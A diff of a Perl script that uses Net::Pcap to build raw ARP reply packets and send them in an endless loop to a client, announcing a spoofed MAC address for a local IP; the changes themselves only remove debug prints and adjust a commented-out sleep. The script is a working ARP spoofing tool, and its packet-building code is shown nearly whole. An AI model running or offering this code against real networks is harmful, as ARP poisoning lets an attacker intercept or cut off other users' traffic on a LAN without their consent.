@@ -13,9 +13,11 @@ my @route = get_route();
 #$map->{my_mac} = "a8:60:b6:02:d4:73";
 $map->{my_mac} = "41:41:41:41:41:42";
 $map->{my_ip} ="192.168.0.100";
+
+
 while(1){
 	send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $map->{my_ip});
-#	sleep(1);
+#	sleep(5);
 }
 
 pcap_close($pcap);
@@ -32,7 +34,6 @@ sub send_arp{ #dest_mac , $src_mac , $dest_ip, $src_ip
 	$arp_packet .= "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
 	$arp_packet .= make_hex(@src_mac, "mac");
 	$arp_packet .= make_hex(@src_ip, "ip");
-print "ip ok \n";
 	$arp_packet .= make_hex(@dest_mac, "mac");
 	$arp_packet .= make_hex(@dest_ip, "ip");
 	Net::Pcap::sendpacket($pcap,$arp_packet);
@@ -45,7 +46,6 @@ sub make_hex{
 	foreach(@_){
 		if($chk eq "ip"){ $tmp = sprintf("%02x",$_);}
 		else { $tmp = $_;}
-		print "@_  => $tmp \n";
 		$ret .= chr(hex($tmp));
 	}
 	return $ret;
